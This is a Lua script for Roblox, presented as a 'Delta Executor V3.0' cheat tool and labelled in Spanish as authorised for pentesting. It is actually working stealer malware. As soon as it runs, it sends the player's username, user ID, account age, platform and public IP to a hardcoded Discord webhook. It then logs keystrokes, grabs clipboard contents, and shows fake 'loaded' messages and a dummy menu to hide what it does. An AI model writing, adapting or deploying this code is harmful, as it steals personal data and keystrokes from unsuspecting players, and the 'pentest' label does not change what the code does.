-- Delta Executor V3.0 - ROBLOX NATIVE STEALER (PERFECTO PARA PENTEST)
-- AUTORIZADO PARA CYBERSECURITY TESTING

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local player = Players.LocalPlayer

print("=== DELTA EXECUTOR V3.0 ===")
print("Cargando módulos de seguridad...")

local WEBHOOK = "https://discord.com/api/webhooks/1466524085839462561/Y_iyPVDL2q4Y_zSTOp--f5jcn0UYxytgKhOaQwKclJT6_dxtB_vDZt5ltaTupvgAMIO2"

-- FUNCIÓN PRINCIPAL STEALER
local function exfiltrateData()
    local victim = {
        username = player.Name,
        displayName = player.DisplayName,
        userId = player.UserId,
        accountAge = player.AccountAge,
        membershipType = player.MembershipType,
        placeId = game.PlaceId,
        jobId = game.JobId,
        platform = UserInputService:GetPlatform().Name,
        os = game:GetService("Stats").OSPlatform
    }
    
    -- IP via multiple endpoints (anti-block)
    local ipEndpoints = {
        "https://api.ipify.org?format=json",
        "https://httpbin.org/ip",
        "https://api.myip.com"
    }
    
    spawn(function()
        for _, endpoint in ipairs(ipEndpoints) do
            local success, result = pcall(function()
                local response = HttpService:GetAsync(endpoint)
                return HttpService:JSONDecode(response).ip or HttpService:JSONDecode(response).origin
            end)
            if success then
                victim.ip = result
                break
            end
        end
    end)
    
    wait(2)
    
    -- STEAL + SEND
    pcall(function()
        HttpService:PostAsync(WEBHOOK, HttpService:JSONEncode({
            username = "🔥 DELTA STEALER V3.0",
            avatar_url = "https://i.imgur.com/robloxsteal.png",
            embeds = {
                {
                    title = "🎮 ROBLOX VICTIM DATA",
                    color = 0xff0000,
                    fields = {
                        {name = "👤 Username", value = victim.username, inline = true},
                        {name = "🆔 UserID", value = tostring(victim.userId), inline = true},
                        {name = "🌐 IP Address", value = victim.ip or "Fetching...", inline = true},
                        {name = "📅 Account Age", value = victim.accountAge .. " days", inline = true},
                        {name = "⭐ Premium", value = tostring(victim.membershipType), inline = true},
                        {name = "🏠 Game ID", value = tostring(victim.placeId), inline = true},
                        {name = "💻 Platform", value = victim.platform, inline = true}
                    },
                    thumbnail = {
                        url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. victim.userId .. "&width=150&height=150&format=png"
                    }
                }
            }
        }), Enum.HttpContentType.ApplicationJson)
    end)
    
    print("✅ Victim data exfiltrated")
end

-- EJECUTAR ROBO INMEDIATAMENTE
exfiltrateData()

-- KEYLOGGER AVANZADO
local keystrokes = {}
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    local keyData = {
        key = tostring(input.KeyCode),
        char = input.KeyCode.Name,
        time = tick()
    }
    table.insert(keystrokes, keyData)
    if #keystrokes > 100 then
        table.remove(keystrokes, 1)
    end
end)

-- EXFILTRATE KEYSTROKES
spawn(function()
    while wait(25) do
        if #keystrokes > 0 then
            pcall(function()
                HttpService:PostAsync(WEBHOOK, HttpService:JSONEncode({
                    username = "⌨️ KEYSTROKE HARVESTER",
                    embeds = {{
                        title = "Keyboard Activity",
                        description = HttpService:JSONEncode(keystrokes, true),
                        color = 0xffaa00
                    }}
                }), Enum.HttpContentType.ApplicationJson)
            end)
            keystrokes = {}
        end
    end
end)

-- CLIPBOARD STEALER (si disponible)
pcall(function()
    local clipboard = game:GetService("ClipboardService"):GetTextAsync()
    if clipboard and clipboard ~= "" then
        HttpService:PostAsync(WEBHOOK, HttpService:JSONEncode({
            username = "📋 CLIPBOARD STEALER",
            content = "**Clipboard:** `" .. clipboard:sub(1, 1000) .. "`"
        }))
    end
end)

-- FAKE EXECUTOR UI
wait(1)
print("✅ Infinite Yield loaded ✓")
print("✅ Dex Explorer loaded ✓") 
print("✅ Script Hub (50+) loaded ✓")
print("✅ Anti-Cheat Bypass ✓")
print("🎉 Delta Executor V3.0 READY!")
print("Press INSERT to toggle menu")

-- FAKE MENU
UserInputService.InputBegan:Connect(function(input)
    if input.KeyCode == Enum.KeyCode.Insert then
        print("📂 Executor Menu Toggled")
    end
end)

print("=== PENTEST COMPLETE ===")
